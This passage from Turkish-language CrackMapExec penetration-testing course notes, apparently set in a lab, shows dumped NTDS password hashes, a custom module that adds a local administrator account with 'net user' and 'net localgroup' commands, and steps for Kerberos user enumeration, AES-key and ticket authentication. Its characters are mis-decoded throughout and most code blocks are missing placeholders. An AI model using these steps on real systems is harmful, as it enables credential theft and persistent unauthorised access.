this could take a while so go grab a redbull...
SMB 172.16.10.3 445 DC01
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f36ccfe434490cddc644901
973d9a344:::
SMB 172.16.10.3 445 DC01
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
0:::
SMB 172.16.10.3 445 DC01
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2c6454dbf95abc7b0a543b90f6f96f
66:::
SMB 172.16.10.3 445 DC01
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
d7e0c089c0:::
SMB 172.16.10.3 445 DC01
derek.walker:1103:aad3b435b51404eeaad3b435b51404ee:69cc8c83c56aeeb7571bbee
c20c6ef65:::
SMB 172.16.10.3 445 DC01
carole.holmes:1104:aad3b435b51404eeaad3b435b51404ee:37ef72fcf42a4021948c7e
d7b33ccf21:::
SMB 172.16.10.3 445 DC01
callum.dixon:1105:aad3b435b51404eeaad3b435b51404ee:3e7c48255206470a13543b2
7b7af18de:::
SMB 172.16.10.3 445 DC01
beth.richards:1106:aad3b435b51404eeaad3b435b51404ee:de3d16603d7ded97bb47cd
6641b1a392:::
SMB 172.16.10.3 445 DC01
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089
c0:::
SMB 172.16.10.3 445 DC01
WS01$:1601:aad3b435b51404eeaad3b435b51404ee:ee7c60ba01f7d361ad5479c86d3ab3
fc:::
SMB 172.16.10.3 445 DC01 [+] Dumped 10 NTDS
hashes to /home/plaintext/.cme/logs/DC01_172.16.10.3_2022-12-
09_065546.ntds of which 8 were added to the database
SMB 172.16.10.3 445 DC01 [*] To extract only
enabled accounts from the output file, run the following command:
SMB 172.16.10.3 445 DC01 [*] cat

/home/plaintext/.cme/logs/DC01_172.16.10.3_2022-12-09_065546.ntds | grep -
iv disabled | cut -d ':' -f1
```


Zaman geÃ§tikÃ§e yeni gÃ¼venlik aÃ§Ä±klarÄ± ortaya Ã§Ä±kacaktÄ±r ve bunlar sektÃ¶r uzmanlarÄ± veya bizim tarafÄ±mÄ±zdan CrackMapExec'e modÃ¼l olarak eklenebilir. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec iÃ§in nasÄ±l bir modÃ¼l oluÅŸturabileceÄŸimizi gÃ¶receÄŸiz.

---

### Kendi CME ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturmak

Yazarlar ve topluluk tarafÄ±ndan oluÅŸturulan birÃ§ok yerleÅŸik CrackMapExec modÃ¼lÃ¼nÃ¼ kullandÄ±k. Bu bÃ¶lÃ¼mde CrackMapExec iÃ§in modÃ¼lÃ¼mÃ¼zÃ¼ nasÄ±l yapabileceÄŸimizi keÅŸfedeceÄŸiz.


### CrackMapExec'i Poetry ile derleyin

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturmadan Ã¶nce, CrackMapExec projesinin nasÄ±l derleneceÄŸini bilmek Ã§ok Ã¶nemlidir. Bu amaÃ§la CME, projelerimizi oluÅŸtururken Ã¶nerilen [Poetry](https://python-poetry.org/)'yi kullanÄ±r. Poetry kullanmÄ±yorsanÄ±z, CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak Ã¼zere Poetry kullanmaya baÅŸlamak iÃ§in Kurulum ve Binaryler bÃ¶lÃ¼mÃ¼ne bir gÃ¶z atÄ±n

Åimdi kodu en sevdiÄŸimiz IDE ile aÃ§abiliriz. Bu bÃ¶lÃ¼mde [VSCode](https://code.visualstudio.com/) kullanacaÄŸÄ±z. VSCode'u [kurmak](https://code.visualstudio.com/download) iÃ§in .deb dosyasÄ±nÄ± kendi web sitesinden indirmemiz gerekiyor. DoÄŸrudan indirme baÄŸlantÄ±sÄ± [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un KurulmasÄ± ve Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

{{CODE_BLOCK_229}}

Daha sonra aÃ§mak iÃ§in `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturun

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturalÄ±m. Yeni bir administrator hesabÄ± oluÅŸturacak basit bir script oluÅŸturacaÄŸÄ±z.

* ./CrackMapExec/cme/modules klasÃ¶rÃ¼ altÄ±nda `createadmin.py` adÄ±nda bir dosya oluÅŸturun.
* AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dosyaya kopyalayÄ±n:

{{CODE_BLOCK_231}}



* Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ Ã¶zelleÅŸtirelim.

BazÄ± deÄŸiÅŸkenleri tanÄ±mlamamÄ±z gerekiyor:

* `name`, modÃ¼l adÄ±nÄ± nasÄ±l Ã§aÄŸÄ±racaÄŸÄ±mÄ±zÄ± belirtir. Bu durumda, `createadmin` dosya adÄ±nÄ± kullanacaÄŸÄ±z.
* `description` modÃ¼lÃ¼n amacÄ± iÃ§in kÄ±sa bir aÃ§Ä±klamadÄ±r. Biz bunu `Create a new administrator account` ayarlayacaÄŸÄ±z.
* `supported_protocols`, modÃ¼lÃ¼ kullanmak iÃ§in desteklenen protokolÃ¼n bir dizisidir. Biz sadece `SMB` kullanacaÄŸÄ±z.
* `opsec_safe`, modÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n gÃ¼venli olduÄŸu anlamÄ±na gelen bir `True` veya `False` deÄŸeridir.
* `multiple_hosts`, bu modÃ¼lÃ¼ birden fazla hedefe karÅŸÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸimiz anlamÄ±na gelir.

AyrÄ±ca, modÃ¼l iÃ§in deÄŸiÅŸkenleri tanÄ±mlamak iÃ§in kullanÄ±lan `options()` methoduna da sahip olacaÄŸÄ±z. Bu durumda, `USER` ve `PASS` olmak Ã¼zere iki seÃ§enek ekleyeceÄŸiz. Her seÃ§eneÄŸin varsayÄ±lan deÄŸeri olabilir ya da olmayabilir. Bu yazara baÄŸlÄ±dÄ±r. USER iÃ§in varsayÄ±lan deÄŸeri dÃ¼z metin olarak ve PASS iÃ§in varsayÄ±lan deÄŸeri `asdasd123` . AyrÄ±ca USER o PASS modÃ¼l seÃ§eneÄŸinin boÅŸ olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in bir kontrol ekledik. EÄŸer durum buysa, modÃ¼lden Ã§Ä±kÄ±lacaktÄ±r.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile Ã§alÄ±ÅŸacaÄŸÄ±z. Bu metot deÄŸiÅŸkenlerimizi almaktan ve hedeflere istediÄŸimiz herhangi bir gÃ¶revi yÃ¼rÃ¼tmekten sorumludur. Ã‡Ä±ktÄ± olarak `context.log.info` ve `context.log.highlight` metotlarÄ±nÄ± kullanacaÄŸÄ±z (farklÄ± renklere sahipler).

Bu execute iÃ§in, yÃ¶ntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z. Komutumuz, yeni bir kullanÄ±cÄ± eklemek iÃ§in `net user username password /add /Y` deÄŸeriyle ve kullanÄ±cÄ±yÄ± administrators grubuna eklemek iÃ§in `net localgroup administrators username /add` deÄŸeriyle command deÄŸiÅŸkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modÃ¼lÃ¼mÃ¼z ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

{{CODE_BLOCK_234}}


### ModÃ¼lÃ¼mÃ¼zÃ¼ Ã‡alÄ±ÅŸtÄ±rma

Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ herhangi bir seÃ§enekle veya herhangi bir seÃ§enek olmadan Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–nce varsayÄ±lan deÄŸerlerle Ã§alÄ±ÅŸtÄ±rarak sonuÃ§larÄ± gÃ¶relim.


### CME ModÃ¼lÃ¼mÃ¼zÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanÄ±cÄ± adÄ± hem de parola belirterek Ã§alÄ±ÅŸtÄ±rabiliriz.

{{CODE_BLOCK_236}}


Ä°lk modÃ¼lÃ¼mÃ¼z Ã§alÄ±ÅŸÄ±yor, ancak Ã§ok daha iyi olabilir. YÃ¼rÃ¼tmeyi iki komuta bÃ¶lebilir ve kullanÄ±cÄ± zaten oluÅŸturulmuÅŸsa veya ÅŸifre politikalara uymuyorsa bir hata gÃ¶sterebiliriz.

AyrÄ±ca `context.log.highlight(p)`'den deÄŸeri alabilir ve bir hata varsa farklÄ± bir ÅŸey gÃ¶sterebiliriz. Bu kodu geliÅŸtirmek iÃ§in fikirleriniz nelerdir?

### DiÄŸer Yazarlardan Ã–ÄŸrenmek

ArtÄ±k yeni bir modÃ¼l oluÅŸturmanÄ±n temellerini Ã¶ÄŸrendiÄŸimize gÃ¶re, diÄŸer modÃ¼lleri keÅŸfetmeli ve birkaÃ§ fikir edinmeliyiz.

Ã–rneÄŸin, `procdump.py` modÃ¼lÃ¼ `procdump.exe` Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ± bir `Base64` string olarak kaydeder, ardÄ±ndan Base64 stringini bir dosyaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r ve hedef iÅŸletim sisteminde tutar. LSASS'Ä±n iÅŸlem kimliÄŸini almak iÃ§in `tasklist` komutunu Ã§alÄ±ÅŸtÄ±rÄ±r, bunu bir deÄŸiÅŸkene kaydeder ve process kimliÄŸini procdump.exe'nin yÃ¼rÃ¼tÃ¼lmesine bir argÃ¼man olarak geÃ§irir.

BaÅŸka bir Ã¶rnek `get_description.py` . Bu modÃ¼lÃ¼ `groupmembership` modÃ¼lÃ¼nÃ¼ oluÅŸturmak iÃ§in Ã¶rnek olarak aldÄ±k. Bu modÃ¼l, bir sorgu gerÃ§ekleÅŸtirmek ve `memberOf` attribute'unu almak iÃ§in ihtiyaÃ§ duyduÄŸumuz gibi, sonuÃ§larÄ±nÄ± bir LDAP sorgusuna dayalÄ± olarak alÄ±r. Kodda bazÄ± deÄŸiÅŸiklikler yaptÄ±k, yeni bir modÃ¼l oluÅŸturduk ve bir pull request gÃ¶nderdik. Pull request kabul edildikten sonra tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir olacaktÄ±r.

Yeni modÃ¼ller oluÅŸturmak iÃ§in MSSQL gibi diÄŸer protokoller iÃ§in baÅŸka Ã¶rneklere de bakabiliriz.


### Pull Request OluÅŸturma

CrackMapExec gibi bir proje topluluk tarafÄ±ndan canlÄ± tutulur. ModÃ¼lÃ¼mÃ¼zÃ¼n tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir hale geleceÄŸi ve aracÄ±n kendisinin bir parÃ§asÄ± olarak dahil edileceÄŸi bir pull request'i ekleyerek projeye katkÄ±da bulunabiliriz.

Bir pull request'i yapmak iÃ§in [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kÄ±lavuzunu takip edebilir ve CrackMapExec'e katkÄ±da bulunabiliriz.

Ä°lerleyen bÃ¶lÃ¼mlerde, CrackMapExec kullanÄ±mÄ± iÃ§in `IPv6`, `Kerberos Kimlik DoÄŸrulama` ve `CrackMapExec` veritabanÄ±nda uzmanlaÅŸma gibi bazÄ± bonus konularÄ± tartÄ±ÅŸacaÄŸÄ±z.


### Ek CME Ä°ÅŸlevselliÄŸi

CrackMapExec, Ã§eÅŸitli senaryolarda Ã§ok faydalÄ± olacak baÅŸka yardÄ±mcÄ± programlara da sahiptir. Bu bÃ¶lÃ¼mde, bunlardan Ã¼Ã§Ã¼nÃ¼ inceleyeceÄŸiz:

* Audit mode
* IPv6 desteÄŸi
* Birden fazla cihaza saldÄ±rÄ±rken tamamlanma yÃ¼zdesi

### Audit Mode

5.3.0 sÃ¼rÃ¼mÃ¼nde yeni bir mod eklendi: `audit modu`. Bu mod, ÅŸifreyi veya hash'i tercih ettiÄŸimiz bir karakterle veya hatta en sevdiÄŸimiz `emoji` ile deÄŸiÅŸtirir. Bu Ã¶zellik, bir mÃ¼ÅŸteri raporu yazarken ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n bulanÄ±klaÅŸmasÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olur.

Audit modunu yapÄ±landÄ±rmak iÃ§in, varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunan yapÄ±landÄ±rma dosyasÄ±nÄ± dÃ¼zenlememiz ve `audit_mode` parametresini tercih ettiÄŸimiz karakterle deÄŸiÅŸtirmemiz gerekir. Bu karakter, CrackMapExec Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken parolanÄ±n veya hash'in yerini alacaktÄ±r. Bu Ã¶rnek iÃ§in `#` karakterini kullanacaÄŸÄ±z


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Åimdi Ã§alÄ±ÅŸtÄ±rabilir ve parolanÄ±n Ã§Ä±ktÄ±da `########` ile deÄŸiÅŸtirildiÄŸini gÃ¶rebiliriz.

{{CODE_BLOCK_238}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, Ã§alÄ±ÅŸtÄ±rma sonucundaki password `#` karakteri ile deÄŸiÅŸtirilir. Ancak, komut ÅŸifreyi gÃ¶sterir. Bu gibi durumlarda, istenen komutu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce parolayÄ± bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile EtkinleÅŸtirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diÄŸer yeteneÄŸi, IPv6 Ã¼zerinden iletiÅŸimi desteklemesidir. Ã‡oÄŸu organizasyon, IPv6'yÄ± varsayÄ±lan olarak etkinleÅŸtirmiÅŸtir, hatta bunu kullanmasalar bile, IPv6'nÄ±n log seviyesinde IPv4 kadar izlenmediÄŸi veya anlaÅŸÄ±lmadÄ±ÄŸÄ± durumlar da olabilir. Bu durum, aÄŸ saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesi ve tespit edilmeden geÃ§mesi iÃ§in bir fÄ±rsat yaratÄ±r.

PopÃ¼ler modÃ¼ller bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, CrackMapExec, `get_netconnections` modÃ¼lÃ¼yle bilgisayarlarÄ±n IPv6 adreslerini belirlememize olanak tanÄ±r. Bu modÃ¼lÃ¼ kullanarak IPv6 Ã¼zerinden komutu Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim.

### get_netconnections ModÃ¼lÃ¼nÃ¼ Ã‡alÄ±ÅŸtÄ±rma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Åimdi IPv6 Ã¼zerinden hedefe eriÅŸelim.

{{CODE_BLOCK_241}}



### Tamamlanma YÃ¼zdesi

ArtÄ±k bir tarama Ã§alÄ±ÅŸÄ±rken enter tuÅŸuna basabilirsiniz ve CME size tamamlanma yÃ¼zdesini ve taranacak kalan host sayÄ±sÄ±nÄ± verecektir. Bu modÃ¼l laboratuvarÄ±nda her seferinde bir host'a saldÄ±rÄ±yoruz, ancak daha kapsamlÄ± bir aÄŸ bulduÄŸunuzda, bÃ¼yÃ¼k olasÄ±lÄ±kla bu Ã¶zelliÄŸi kullanacaksÄ±nÄ±z. Åimdilik `--shares` seÃ§eneÄŸini Ã§alÄ±ÅŸtÄ±ralÄ±m ve bitmeden Ã¶nce enter tuÅŸuna basalÄ±m.


### Tamamlanma YÃ¼zdesi

{{CODE_BLOCK_242}}

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, Kerberos kimlik doÄŸrulamasÄ±nÄ± ve CrackMapExec'in bu kimlik doÄŸrulama yÃ¶ntemi iÃ§in iÃ§erdiÄŸi yeni deÄŸiÅŸiklikleri tartÄ±ÅŸacaÄŸÄ±z.

---


### Kerberos Authentication

Yazma sÄ±rasÄ±nda CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri iÃ§in Kerberos Kimlik DoÄŸrulamasÄ±nÄ± desteklemektedir. Kerberos Kimlik DoÄŸrulamasÄ±nÄ± kullanmanÄ±n iki (2) yolu vardÄ±r:

* `ccache` dosyasÄ±nÄ± belirtmek iÃ§in `KRB5CCNAME` env adÄ±nÄ± kullanma. 
* CrackMapExec 5.4.0'dan baÅŸlayarak, artÄ±k Kerberos kimlik doÄŸrulamasÄ± iÃ§in bir Ticketla `KRB5CCNAME` environment variable'Ä±nÄ± kullanmamÄ±z gerekmiyor. Bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanÄ±rken gÃ¶z Ã¶nÃ¼nde bulundurulmasÄ± gereken Ã¶nemli bir unsur, saldÄ±rdÄ±ÄŸÄ±mÄ±z bilgisayarÄ±n domain ve hedef makinenin `FQDN`'sini Ã§Ã¶zÃ¼mlemesi gerektiÄŸidir. Ä°nternal bir aÄŸdaysak, bilgisayarÄ±mÄ±zÄ± ÅŸirketin DNS'sine domain adÄ± Ã§Ã¶zÃ¼mlemeleri yapacak ÅŸekilde yapÄ±landÄ±rabiliriz, ancak durum bÃ¶yle deÄŸildir. DNS'i yapÄ±landÄ±ramayÄ±z ve `/etc/hosts` dosyasÄ±na domain controller ve hedef makinemiz iÃ§in FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doÄŸrulamasÄ± ile kullanmayÄ± deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seÃ§eneÄŸi olmadan bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash ile kullandÄ±ÄŸÄ±mÄ±zda, NTLM kimlik doÄŸrulamasÄ± gerÃ§ekleÅŸtiririz. Kerberos seÃ§eneÄŸini kullanÄ±rsak bunun yerine Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

Yeni Kerberos kimlik doÄŸrulama uygulamasÄ± ile CrackMapExec, CME iÃ§inde kendi `Kerbrute`'unu oluÅŸturmak iÃ§in tÃ¼m bileÅŸenlere sahiptir. Bu, CME'nin bir kullanÄ±cÄ±nÄ±n domain Ã¼zerinde var olup olmadÄ±ÄŸÄ±nÄ± ve bu kullanÄ±cÄ±nÄ±n Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± anlayabileceÄŸi anlamÄ±na gelir. Bunu aÅŸaÄŸÄ±daki hesaplarla Ã§alÄ±ÅŸÄ±rken gÃ¶relim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

{{CODE_BLOCK_246}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `Kerbrute` CrackMapExec TGT isteklerini Ã¶n kimlik doÄŸrulamasÄ± olmadan gÃ¶nderdiÄŸinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasÄ±yla yanÄ±t verirse, kullanÄ±cÄ± adÄ± mevcut deÄŸildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasÄ±yla yanÄ±t verir, bu da kullanÄ±cÄ± adÄ±nÄ±n mevcut olduÄŸu anlamÄ±na gelir. Son olarak, `asreproast` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z bir hata hesabÄ± gÃ¶rÃ¼rsek, daha Ã¶nce `AESREPRoast` HesaplarÄ±nÄ± Bulma bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi AESREPoast saldÄ±rÄ±larÄ±na karÅŸÄ± hassastÄ±r.

Bu, oturum aÃ§ma hatalarÄ±na neden olmaz, bu nedenle herhangi bir hesabÄ± kilitlemez, ancak Kerberos logu etkinleÅŸtirilmiÅŸse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralÄ± bir Windows olay kimliÄŸi oluÅŸturur.


### AES-128 veya AES-256 kullanma

AyrÄ±ca, Kerberos Kimlik DoÄŸrulamasÄ± iÃ§in AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araÃ§lar, genellikle bu tÃ¼r hash'leri alabilir. AES-128 veya AES-256 kullandÄ±ÄŸÄ±mÄ±zda, trafiÄŸimiz normal Kerberos trafiÄŸine daha Ã§ok benzeyecek ve bu da operasyonel bir avantaj (opsec) saÄŸlayacaktÄ±r. Hadi Secretsdump'u kullanalÄ±m ve ardÄ±ndan AES256 ile kimlik doÄŸrulamasÄ± yapalÄ±m.


### AES256 ile Kimlik DoÄŸrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanÄ±cÄ±nÄ±n oturumu sÃ¼rdÃ¼ÄŸÃ¼ sÃ¼rece geÃ§erli kalÄ±rlar, bu nedenle servislere birden fazla kez kimlik doÄŸrulamasÄ± yapmak (Ã¶rneÄŸin, bir web veya posta sunucusuna birden fazla kez baÄŸlanmak) her seferinde KDC ile iletiÅŸim kurmayÄ± gerektirmez.

Ã‡oÄŸu durumda, Linux makineleri Kerberos tickerlarÄ± ccache dosyalarÄ± olarak depolar, sistemlerin ticketlarÄ± kullanma ÅŸekli, `ccache` dosyasÄ±nÄ±n yolunu gÃ¶steren `KRB5CCNAME` environment variable aracÄ±lÄ±ÄŸÄ±yla olur. robert kullanÄ±cÄ±sÄ± iÃ§in bir ticket (ccache dosyasÄ±) oluÅŸturalÄ±m ve DC01'e kimlik doÄŸrulamasÄ± yapalÄ±m

Ticket'Ä± oluÅŸturmak iÃ§in [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracÄ±nÄ± kullanacaÄŸÄ±z ve KRB5CCNAME environment variable'i getTGT.py tarafÄ±ndan oluÅŸturulan ccache dosyasÄ±nÄ±n yoluna ayarlayacaÄŸÄ±z.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doÄŸrulama yÃ¶ntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak iÃ§in `--use-kcache` seÃ§eneÄŸini kullanmamÄ±z gerekir. KullanÄ±cÄ± adÄ± ve parola seÃ§enekleri gerekli deÄŸildir.


### ccache DosyasÄ±nÄ± Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak Kullanma (SMB ProtokolÃ¼)

{{CODE_BLOCK_251}}


### Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak ccache DosyasÄ±nÄ±n KullanÄ±lmasÄ± (LDAP ProtokolÃ¼)

{{CODE_BLOCK_252}}

Kerberos Kimlik DoÄŸrulamasÄ±nÄ± `MSSQL` protokolÃ¼ ile kullanmak iÃ§in hedef olarak IP adresi yerine bilgisayar adÄ±nÄ± veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolÃ¼nÃ¼n perde arkasÄ±nda IP'yi FQDN'ye dÃ¶nÃ¼ÅŸtÃ¼rmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasÄ±dÄ±r.


### MSSQL ProtokolÃ¼ ile ccache DosyasÄ±nÄ± Kullanma

{{CODE_BLOCK_253}}

KullanÄ±cÄ± adlarÄ± ve parolalarla yaptÄ±ÄŸÄ±mÄ±z gibi Kerberos kimlik doÄŸrulamasÄ± ile herhangi bir modÃ¼lÃ¼ veya seÃ§eneÄŸi Ã§alÄ±ÅŸtÄ±rabiliriz


### Kerberos Kimlik DoÄŸrulamasÄ± ile PaylaÅŸÄ±mlarÄ± Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'Ä±n nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrendik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, CrackMapExec veritabanÄ± `cmedb` ile etkileÅŸime gireceÄŸiz

---


### CMEDB'de UzmanlaÅŸmak

CME otomatik olarak tÃ¼m kullanÄ±lan/dump edilen kimlik bilgilerini (diÄŸer bilgilerle birlikte) ilk Ã§alÄ±ÅŸtÄ±rmada kurulan `SQLite` veritabanÄ±nda saklar. TÃ¼m Ã§alÄ±ÅŸma alanlarÄ± ve ilgili veritabanlarÄ± `~/.cme/workspaces` iÃ§inde saklanÄ±r. VarsayÄ±lan veritabanlarÄ± `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol iÃ§in bir SQLite dosyasÄ± bulunur.


### VarsayÄ±lan VeritabanlarÄ±nÄ± Listeleme

{{CODE_BLOCK_255}}

### VeritabanÄ± ile EtkileÅŸim

CME, back-end veritabanÄ± ile etkileÅŸimi kolaylaÅŸtÄ±ran ikinci bir komut satÄ±rÄ± script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i gÃ¶tÃ¼recektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

VarsayÄ±lan workspace adÄ± `default` olarak adlandÄ±rÄ±lÄ±r (bilgi `prompt` gÃ¶sterildiÄŸi gibi). Bir workspace seÃ§ildiÄŸinde, CME'de yaptÄ±ÄŸÄ±mÄ±z her ÅŸey bu workspace'de saklanacaktÄ±r. Bir workspace oluÅŸturmak iÃ§in, `cmedb (default) >` komut promt root'una gitmemiz gerekir. EÄŸer protokol veritabanÄ±ndaysak, geri komutunu kullanmamÄ±z gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek iÃ§in `workspace list` , workspace'i deÄŸiÅŸtirmek iÃ§in ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve DeÄŸiÅŸtirme

{{CODE_BLOCK_258}}


### Bir ProtokolÃ¼n VeritabanÄ±na EriÅŸim

cmedb her protokol iÃ§in bir veritabanÄ±na sahiptir, ancak bu modÃ¼lÃ¼n yazÄ±ldÄ±ÄŸÄ± sÄ±rada yalnÄ±zca `SMB` ve `MSSQL` yararlÄ± seÃ§eneklere sahiptir:

| Protokol | SeÃ§enekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolÃ¼n veritabanÄ±na eriÅŸmek iÃ§in `proto` `<protocol>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n. Protokol iÃ§inde, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `help` seÃ§eneÄŸini kullanabiliriz:

### SMB Protokol VeritabanÄ±na BaÄŸlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolÃ¼nÃ¼ her kullandÄ±ÄŸÄ±mÄ±zda, kimlik bilgileri, saldÄ±rdÄ±ÄŸÄ±mÄ±z hostlar, eriÅŸtiÄŸimiz paylaÅŸÄ±mlar ve listelediÄŸimiz gruplar CrackMapExec veritabanÄ±nda saklanÄ±r. VeritabanÄ±nda sahip olduÄŸumuz verilere eriÅŸelim.

### Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

CrackMapExec veritabanÄ±, CrackMapExec kullanarak kullandÄ±ÄŸÄ±mÄ±z veya elde ettiÄŸimiz tÃ¼m kimlik bilgilerini depolar. Bu veritabanÄ±, kimlik bilgilerinin tÃ¼rÃ¼nÃ¼, `dÃ¼z metin` veya `hash` olup olmadÄ±ÄŸÄ±nÄ±, domain, kullanÄ±cÄ± adÄ± ve ÅŸifreyi saklar. SMB protokolÃ¼nÃ¼n kimlik bilgilerini gÃ¶rmek iÃ§in protokol iÃ§indeki `creds` seÃ§eneÄŸini kullanmamÄ±z gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, creds'ten sonra bir `kullanÄ±cÄ± adÄ±` ekleyerek belirli kullanÄ±cÄ±larÄ± da sorgulayabiliriz. AyrÄ±ca `creds hash` seÃ§eneÄŸi ile tÃ¼m hash'leri veya `creds plaintext` seÃ§eneÄŸi ile tÃ¼m plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve DÃ¼z Metin Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolÃ¼ne kaydedilir ve SMB kimlik bilgilerini gÃ¶rÃ¼ntÃ¼lediÄŸimiz gibi gÃ¶rÃ¼ntÃ¼lenebilir


### MSSQL iÃ§in Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

